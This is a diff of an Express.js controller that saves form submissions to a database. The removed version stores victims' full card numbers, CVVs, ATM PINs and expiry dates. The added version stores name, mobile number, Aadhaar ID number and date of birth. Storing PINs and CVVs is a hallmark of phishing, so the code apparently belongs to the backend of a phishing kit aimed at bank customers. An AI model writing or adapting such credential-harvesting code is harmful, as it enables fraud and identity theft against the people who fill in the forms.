@@ -4,34 +4,25 @@ const User = require('../models/User');
 // Save user data to the database
 exports.saveUserData = async (req, res) => {
     try {
-        const { name, mobile, dob, cardLastSix, atmPin, cvv, fullCardNumber, expiryDate } = req.body;
-        
-        // Creating a new user entry
-        const user = new User({
+        const { name, mobile, aadhar, dob } = req.body;
+
+        const newUser = new User({
             name,
             mobile,
-            dob,
-            cardLastSix,
-            atmPin,
-            cvv,
-            fullCardNumber,
-            expiryDate
+            aadhar,
+            dob
         });
         
-        // Save the user to the database
-        await user.save();
-        
-        res.status(201).json({
+        await newUser.save();
+        res.status(200).json({
             success: true,
-            message: "User data saved successfully",
-            data: user
+            message: "User Data Submitted Successfully!"
         });
-    } catch (err) {
-        console.error(err);
+    } catch (error) {
+        console.error(error);
         res.status(500).json({
             success: false,
-            message: "Error saving user data",
-            error: err.message
+            message: "Error occurred while submitting user data"
         });
     }
 };
